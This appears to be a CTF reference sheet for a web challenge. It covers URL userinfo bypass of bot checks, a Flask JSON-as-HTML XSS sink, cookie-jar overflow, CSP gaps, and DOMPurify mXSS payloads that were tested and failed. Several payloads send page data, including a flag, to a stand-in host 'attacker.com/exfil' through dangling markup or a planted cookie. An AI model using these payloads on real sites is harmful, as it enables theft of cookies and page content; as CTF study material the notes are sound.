# Deskmesh-style Patterns — Cookie Tossing, URL Userinfo Bypass, Dangling Markup, Flask text/html Sink

Source: Deskmesh Support CTF challenge (2026, HackNyx CTF, 470 pts, 0 solves globally as of June 2026)

---

## 1. URL Userinfo Bypass for Bot URL Validation

**Pattern:** Server validates bot-visited URLs with `url.startswith("http://127.0.0.1:7000")`. The `@` (userinfo) in a URL makes the browser interpret the part before `@` as credentials and the part after as the real host.

**Bypass:** `http://127.0.0.1:7000@attacker.com/exploit.html`
- Python `str.startswith()` passes ✓
- Browser navigates to `attacker.com` (treats `127.0.0.1:7000` as userinfo)
- Works with Selenium/headless Chrome bots

**Detect:** Any bot URL validation using string prefix check. Look for placeholder hints like `http://127.0.0.1:PORT/...`.

**Limitations:** Some browsers show a warning for userinfo URLs. Headless Chrome (as used in CTF bots) does NOT show warnings and navigates silently.

**Empirically verified (June 2026, Chrome 147 + Chromium 149):** Works reliably. The bot lands on the attacker host with empty cookies for that origin; existing cookies for the inner `127.0.0.1:7000` host remain in the cookie jar and will be sent on same-origin requests initiated from attacker pages (e.g., `window.open('http://127.0.0.1:7000/queue')` sends Lax cookies on top-level GET navigation).

---

## 2. Flask `make_response(json.dumps(...))` as XSS Sink

**Pattern:** Flask endpoint returns JSON via `make_response(json.dumps(data))` without setting `mimetype` or `content_type`. Flask defaults to `text/html`. Combined with a permissive CSP (`script-src 'unsafe-inline'`), any user-controlled content in the JSON becomes executable HTML.

**Example response:**
```
Content-Type: text/html; charset=utf-8
Content-Security-Policy: default-src 'none'; script-src 'unsafe-inline'; style-src 'self'

{"id": "abc", "body": "<script>alert(1)</script>", "created_at": 123}
```

The browser parses this as HTML. The `<script>` tag inside the JSON string executes because:
- Content-Type is text/html (browser renders as HTML)
- CSP allows inline scripts
- JSON escaping uses `\"` which doesn't prevent HTML parsing of `<script>` tags

**Requirement:** Need the browser to navigate to this endpoint directly (not via fetch). If the endpoint requires a custom header (e.g., `X-Desk-Action: view`), this becomes the main obstacle — browsers can't send custom headers via navigation. Find a same-origin code path that already sets the header (e.g., the queue page's `api()` function uses `fetch()` with `X-Desk-Action: view` set explicitly).

**Note:** Flask/Werkzeug header matching is case-insensitive: `x-desk-action: view` works the same as `X-Desk-Action: view`.

---

## 3. Cookie Jar Overflow to Evict HttpOnly Cookies

**Pattern:** When an HttpOnly cookie exists and can't be overwritten by JavaScript, overflow the browser's per-domain cookie limit (~180 cookies in Chrome) to evict the oldest cookie.

**Attack:**
```javascript
// Evict old cookies by filling the jar
for (let i = 0; i < 200; i++) {
  document.cookie = `pad${i}=x; path=/`;
}
// Now set our target cookie (old HttpOnly one was evicted)
document.cookie = "banner=<img src='http://attacker/exfil?d=; path=/status";
```

**Preconditions:**
- JS execution on the same domain (any port — cookies are host-scoped, not port-scoped)
- The target cookie must be the OLDEST in the jar (first to be evicted)

**Cookie ordering note:** Chrome sends cookies ordered by: (1) longer path first, (2) older creation-time first for same path. Flask/Werkzeug `request.cookies.get(name)` returns the FIRST occurrence when duplicates exist.

---

## 4. Dangling Markup Injection via Cookie Reflection

**Pattern:** A cookie value is reflected in HTML with `{{ cookie | safe }}` (Jinja2 no-escape). If CSP allows `img-src http: https:` but blocks scripts, use dangling markup to exfiltrate page content via an unclosed `<img src="` attribute.

**Payload:** Set cookie to:
```
<img src="https://attacker.com/exfil?d=
```

**Rendered HTML:**
```html
<p><img src="https://attacker.com/exfil?d=</p>
  Some text here...
  <p>FLAG{secret_flag_here}</p>
...
<footer class="site-footer">
```

The `src` attribute captures everything until the next `"` character in the HTML. The browser makes a GET request to `attacker.com` with the flag in the URL.

**CSP requirements:** `img-src http: https:` (or `img-src *`). Script execution NOT needed.

**Key insight:** Works even when `script-src` is locked down, because `<img>` loading is governed by `img-src`, not `script-src`.

---

## 5. Dual CSP Context Exploitation

**Pattern:** Application serves different CSP policies on different routes:
- Route A: `script-src 'unsafe-inline'` but `default-src 'none'` (no fetch/connect)
- Route B: `connect-src 'self'` but `script-src 'nonce-...'` (no inline scripts)

**Exploitation strategy:**
- Get code execution on Route A's context (script runs but can't fetch)
- Use DOM operations that don't require network: `document.cookie`, `window.location`
- Navigate to a target page where the cookie payload fires (e.g., dangling markup via img-src)

**Key principle:** `document.cookie` is a DOM operation, NOT a network request. CSP `connect-src 'none'` does NOT block cookie setting.

---

## 6. Port-Scoped Origins vs Host-Scoped Cookies

**Key facts for exploitation:**
- **Same-Origin Policy:** `http://host:7000` and `http://host:7001` are DIFFERENT origins (can't read each other's DOM/responses)
- **Cookies:** Scoped to HOST (not port). A cookie set on `127.0.0.1:7000` is sent to `127.0.0.1:7001` if path matches
- **Private Network Access (PNA):** In Chrome, HTTPS→private-IP fetch is blocked. HTTP→HTTP between private IPs is less restricted. Loopback→loopback is generally allowed.
- **CSP form-action:** Often omitted from CSP policies. If not set, forms can submit to ANY URL regardless of other CSP restrictions.
- **CSP and navigation:** `window.location` redirects are NOT restricted by `connect-src` or `default-src`. Top-level navigation is only restricted by the (rarely-used) `navigate-to` directive.

---

## 7. DOMPurify 3.3.1 mXSS — what actually works (verified June 2026)

**Affected:** DOMPurify < 3.3.3 has a regex gap in the SAFE_FOR_XML attribute check. The original 3.3.1 regex was:
```js
/((--!?|])>)|<\/(style|title|textarea)/i
```
The 3.3.3 fix expanded it to include `script|xmp|noscript|iframe|noembed|noframes`. So a closing tag like `</script>` inside an attribute value triggers DOMPurify 3.3.1 to KEEP the attribute (because the regex doesn't match `</script>`).

**Test case 102** (the regression test added in 3.3.3 fix): `<div id="102"><img src="x` `<script>alert(102)</script>">//["'`-->]]>]</div>` — the backtick (`` ` ``) is meant to close the `src` attribute, exposing the `<script>` tag.

**Empirical reality (Chrome 147 + DOMPurify 3.3.1, June 2026):**
- Chrome 147 treats backtick as a literal character inside an attribute (HTML5 spec does not recognize `` ` `` as an attribute boundary). The browser sees `<img src="x` `<script>alert(102)</script>">` with everything inside `src`. Script never escapes the attribute, does NOT execute.
- DOMPurify 3.3.1's sanitized output for this payload is the safe HTML-encoded form `<img src="x` `&lt;script&gt;alert(102)&lt;/script&gt;">`.
- The test-102 bypass works in jsdom or older parsers, NOT in current Chromium.

**Other mXSSes tested in Chrome 147 + DOMPurify 3.3.1 default config — ALL fail:**
- `<noscript><!-- </noscript><img src=x onerror=alert(1)> --></noscript>` → sanitized to `<b></b>` (noscript content dropped)
- `<xmp><p title="</xmp><img src=x onerror=alert(1)>">` → sanitized to `<img src="x">"&gt;` (onerror stripped)
- `<noscript><a alt="</noscript><img src=x onerror=alert(1)>"></noscript>` → sanitized to `<a alt="&lt;/noscript&gt;&lt;img src=x onerror=alert(1)&gt;"></a>` (onerror in attribute, not executable)
- `<math><mtext><table><mglyph><style><!--</style><img src=x onerror=alert(1)>` (CVE-2025-26791 PoC) → requires `SAFE_FOR_TEMPLATES: true`, queue page uses default → sanitized to `<math><mtext><table></table></mtext></math>` (img removed)
- GHSA-87xg-pxx2-7hvx selectedcontent variant → affects DOMPurify 3.4.4+, NOT 3.3.1; queue page uses 3.3.1 → not vulnerable

**Conclusion:** there is NO known mXSS that bypasses DOMPurify 3.3.1 default config in Chrome 147/149 as of June 2026. If you see a CTF challenge or writeup asserting otherwise, the reference is stale or was tested on a non-browser parser.

**Even if mXSS did fire on the queue page, it would NOT give code execution:**
- Queue CSP: `default-src 'none'; script-src 'nonce-{nonce}'; style-src 'self'; connect-src 'self'`
- Event handlers (`onerror`, `onload`, `ontoggle`) are blocked by `script-src 'nonce-...'` (no `'unsafe-inline'`)
- Inline `<script>` requires the matching nonce (random per request, can't predict)
- `<img src=...>` (dangling markup), `<a href=...>`, `<meta http-equiv="refresh">` work as HTML injection
- `<base href=...>` blocked (base-uri defaults to default-src 'none')
- `<link rel="stylesheet" href="...">` blocked (style-src 'self')
- `<form action="...">`, `<input autofocus onfocus=...>` blocked (form-action 'none', event handlers)
- Only useful injection on queue page = `<meta http-equiv="refresh" content="0;url=...">` (navigation, no data exfil)

**Detection:** Check `/static/purify.js` version string. DOMPurify 3.3.1 header: `/*! @license DOMPurify 3.3.1 ...*/`

---

## See also
- `references/deskmesh-flask-dual-port.md` — same challenge, focused on the bot flow and intended CRLF chain (now flagged as broken in modern Chrome)
- `references/deskmesh-cookie-xss-patterns.md` — sibling reference focused on the dangling-markup banner cookie approach
- `references/deskmesh-actual-exploitability-2026.md` — full session log: which attack paths were tried, which work, which blockers remain